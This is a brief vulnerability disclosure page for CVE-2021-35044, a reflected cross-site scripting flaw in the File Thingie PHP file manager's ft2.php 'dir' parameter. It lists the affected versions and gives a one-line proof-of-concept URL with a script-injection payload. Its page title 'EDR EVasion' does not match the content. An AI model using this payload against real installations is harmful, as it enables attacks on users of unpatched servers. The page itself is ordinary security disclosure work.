---
layout: default
title: EDR EVasion
parent: Research
nav_order: 3
---

# CVE-2021-35044
{: .fs-9 }

File Thingie - XSS Reflected
{: .fs-6 .fw-300 }

---

### Description

File Thingie is a PHP File Manager. It is affected by XSS Reflected via the ft2.php dir parameter.

The versions affected are v2.0, v2.0.8, v2.5.0, v2.5.2, v2.5.3, v2.5.4, v2.5.5, v2.5.6, v2.5.7

### PoC
```yaml
https://example.com/ft2.php?dir=</script><script>alert(1)</script>
```

### Reference

[CVE-2021-35044](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35044)
